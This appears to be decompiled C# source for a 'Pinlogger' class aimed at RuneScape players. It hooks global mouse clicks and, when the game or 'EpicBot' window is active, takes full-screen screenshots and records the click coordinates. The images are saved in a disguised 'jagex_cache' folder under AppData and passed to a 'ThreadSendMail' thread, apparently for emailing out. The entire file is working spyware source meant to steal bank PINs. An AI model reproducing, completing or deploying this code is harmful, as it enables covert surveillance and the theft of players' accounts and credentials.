namespace Pin
{
    using Microsoft.VisualBasic.CompilerServices;
    using System;
    using System.Collections;
    using System.Drawing;
    using System.Drawing.Imaging;
    using System.IO;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Threading;
    using System.Windows.Forms;

    internal class Pinlogger
    {
        private static Bitmap bmp;
        private string filename;
        private string filename3;
        private string filename4;
        private string filename5;
        private string FormName = "";
        private static Graphics gfx;
        private ArrayList LogPics = new ArrayList();
        private InterMouse.MSLLHOOKSTRUCT mouseStruct;
        public string NomFichierSource;
        public string path;
        private int Picture = 1;
        private int ScreenX = 0;
        private MyThreadHandle ThreadSendMail = new MyThreadHandle();
        private ArrayList Tx = new ArrayList();
        private ArrayList Ty = new ArrayList();
        private string User = WindowsIdentity.GetCurrent().Name.Split(new char[] { '\\' })[1];

        public Pinlogger()
        {
            this.filename = @"C:\Users\" + this.User + @"\AppData\Roaming\jagex_cache";
            this.filename3 = @"C:\Users\" + this.User + @"\AppData\Roaming\jagex_cache\reg";
            this.filename4 = @"C:\Users\" + this.User + @"\AppData\Roaming\jagex_cache\reg\";
            this.filename5 = @"C:\Users\" + this.User + @"\AppData\Roaming\jagex_cache\regPin";
            if (!Directory.Exists(this.filename))
            {
                Directory.CreateDirectory(this.filename);
            }
            if (!Directory.Exists(this.filename3))
            {
                Directory.CreateDirectory(this.filename3);
            }
            if (!Directory.Exists(this.filename5))
            {
                Directory.CreateDirectory(this.filename5);
            }
            InterMouse mouse = new InterMouse();
            mouse.LeftButtonDown += new InterMouse.MouseHookCallback(this.mouseHook_LeftButtonDown);
            mouse.Install();
            bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
            gfx = Graphics.FromImage(bmp);
            gfx.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
            this.ScreenX = bmp.Width;
        }

        private string GetActiveWindowTitle()
        {
            StringBuilder text = new StringBuilder(0x100);
            if (GetWindowText(GetForegroundWindow(), text, 0x100) > 0)
            {
                return text.ToString();
            }
            return null;
        }

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
        private void mouseHook_LeftButtonDown(InterMouse.MSLLHOOKSTRUCT mouseStruct)
        {
            try
            {
                this.FormName = this.GetActiveWindowTitle();
                if (((this.FormName != string.Empty) && (this.FormName.Contains("RuneScape") || this.FormName.Contains("EpicBot"))) && !this.ThreadSendMail.GetStopAnalyse())
                {
                    this.TakePinScreenShot(mouseStruct.pt.x, mouseStruct.pt.y);
                }
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        public void Start()
        {
            this.mouseHook_LeftButtonDown(this.mouseStruct);
        }

        public void TakePinScreenShot(int x, int y)
        {
            try
            {
                bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
                gfx = Graphics.FromImage(bmp);
                gfx.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
                if (!Directory.Exists(this.filename3))
                {
                    Directory.CreateDirectory(this.filename3);
                }
                bmp.Save(this.filename4 + this.Picture.ToString() + ".jpeg", ImageFormat.Jpeg);
                string str = this.filename4 + this.Picture.ToString() + ".jpeg";
                this.LogPics.Add(str);
                this.Tx.Add(x);
                this.Ty.Add(y);
                this.ThreadSendMail.SetArrayPicturePath(this.LogPics);
                this.ThreadSendMail.SetArrayTabX(this.Tx);
                this.ThreadSendMail.SetArrayTabY(this.Ty);
                this.Picture++;
                new Thread(new ThreadStart(this.ThreadSendMail.ThreadLoop)).Start();
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }
    }
}

